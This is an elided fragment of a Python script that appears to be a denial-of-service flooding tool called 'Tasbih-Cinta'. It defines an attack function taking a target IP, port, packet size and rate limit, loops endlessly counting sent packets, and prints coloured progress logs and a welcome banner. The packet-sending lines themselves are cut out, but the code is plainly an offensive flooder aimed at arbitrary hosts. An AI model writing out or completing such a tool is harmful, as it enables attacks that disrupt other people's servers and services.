...
def attack(ip: str, port: int, packet_size: int, rate_limit: float):
    ...
    try:
        while True:
            ...
            sent += 1
            log_message(f"\033[100m \033[34mTasbih-Cinta\033[0m \033[31m- {threading.get_ident()}. \033[103m \033[97mSent{sent} \033[0m\033[94m{ip}:{port}")
            log_message(f"\033[101m \033[97mTasbih-Cinta\033[0m \033[94m- {threading.get_ident()}. \033[100m \033[31mSent{sent} \033[0m\033[94m{ip}:{port}")
...
print("\033[103m     \033[33mWelcome to zona TASBIH CINTA\033[0m")
time.sleep(5)
print("Loading.......")
